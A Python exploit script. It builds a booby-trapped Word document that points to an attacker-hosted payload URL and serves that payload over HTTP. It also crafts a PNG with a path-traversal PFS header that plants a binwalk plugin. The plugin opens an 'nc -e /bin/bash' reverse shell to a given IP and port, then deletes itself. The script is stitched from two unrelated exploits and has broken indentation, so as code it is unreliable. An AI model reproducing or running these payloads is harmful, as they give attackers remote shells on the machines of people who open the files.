from ast import arg
from cgi import print_arguments
import re
import os
import http.server 
from http.server import *
import socketserver
PORT = 1337
DIRECTORY = "web"
import zipfile
import argparse
import shutil
import inspect
from pip import main


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--payload-url",
        default="http://127.0.0.1:1337/pwn.html",
        help="URL to the server that's hosting your payload.",
        required=True
    )
    parser.add_argument("file", help="Path to input .png file",default=1)
    parser.add_argument("ip", help="Ip to nc listener",default=1)
    parser.add_argument("port", help="Port to nc listener",default=1)
    args = parser.parse_args()
    return args
    
    
def build_malicious_doc(args):
    word_document_directory = "ohno"
    file_name = 'poisonedWordFile.doc'
    with open ('ohno/word/_rels/document.xml.rels', 'r+' ) as target_file:
        file_contents = target_file.read()
        file_contents = re.sub('TIME2PWNMYSELF', args.payload_url, file_contents, flags = re.M)
        target_file.seek(0)
        target_file.write(file_contents)
        target_file.truncate()
    try:
        shutil.make_archive(file_name, 'zip', word_document_directory)
        os.rename(file_name+'.zip', file_name)
    except FileExistsError as err:
    os.remove("ohno/word/_rels/document.xml.rels")
    shutil.copy('source_files/document.xml.rels', 'ohno/word/_rels/')
     
        
def host_payload():
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()


def main():
    args = parse_args()
    build_malicious_doc(args)
    host_payload()
    if args.file and args.ip and args.port:
    header_pfs = bytes.fromhex("5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e")
    lines = ['import binwalk.core.plugin\n','import os\n', 'import shutil\n','class MaliciousExtractor(binwalk.core.plugin.Plugin):\n','    def init(self):\n','        if not os.path.exists("/tmp/.binwalk"):\n','            os.system("nc ',str(args.ip)+' ',str(args.port)+' ','-e /bin/bash 2>/dev/null &")\n','            with open("/tmp/.binwalk", "w") as f:\n','                f.write("1")\n','        else:\n','            os.remove("/tmp/.binwalk")\n', '            os.remove(os.path.abspath(__file__))\n','            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), "__pycache__"))\n']

    in_file = open(args.file, "rb")
    data = in_file.read()
    in_file.close()
    
    with open("/tmp/plugin", "w") as f:
       for line in lines:
          f.write(line)

    with open("/tmp/plugin", "rb") as f: 
        content = f.read()

    os.system("rm /tmp/plugin")

    with open("binwalk_exploit.png", "wb") as f:
        f.write(data)
        f.write(header_pfs)
        f.write(content)




if __name__ == "__main__":
    main()
